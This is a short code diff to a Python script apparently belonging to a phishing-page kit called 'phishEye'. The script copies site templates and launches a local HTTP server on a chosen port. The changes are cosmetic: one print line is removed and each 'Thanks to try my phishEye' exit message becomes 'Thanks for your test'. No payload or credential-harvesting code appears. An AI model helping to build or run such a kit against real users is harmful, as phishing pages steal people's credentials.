@@ -68,7 +68,6 @@ try:
             print(cur_path)
             os.system(mkdir_command)
             os.system(cp_command)
-            print("Site page not found!!")
             
 
     def sites(type):
@@ -135,7 +134,7 @@ try:
                             "Opps!!! You entred wrong key.\nI am taking default value"
                         )
             except KeyboardInterrupt:
-                sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
+                sys.exit("\n\nThanks for your test.\nByeeeeeee......")
             except:
                 pass
             # Choosing site name
@@ -150,7 +149,7 @@ try:
                 else:
                     print("Opps!!! You entred wrong key.\nI am taking default value")
             except KeyboardInterrupt:
-                sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
+                sys.exit("\n\nThanks for your test.\nByeeeeeee......")
             except:
                 pass
             # Choosing port number
@@ -159,7 +158,7 @@ try:
                 if _port is not None:
                     port = _port
             except KeyboardInterrupt:
-                sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
+                sys.exit("\n\nThanks for your test.\nByeeeeeee......")
             except:
                 pass
 
@@ -192,7 +191,7 @@ try:
                 else:
                     sys.exit("\nPlease choose a valid number.")        
             except KeyboardInterrupt:
-                sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
+                sys.exit("\n\nThanks for your test.\nByeeeeeee......")
             except:
                 pass
             print("\n\nPlease wait.....")
@@ -205,4 +204,4 @@ try:
             os.system(f"python3 ./server/httpServer.py -p {port}")
 
 except KeyboardInterrupt:
-    print("\n\nThanks to try my phishEye.\nByeeeeeee......")
+    print("\n\nThanks for your test.\nByeeeeeee......")
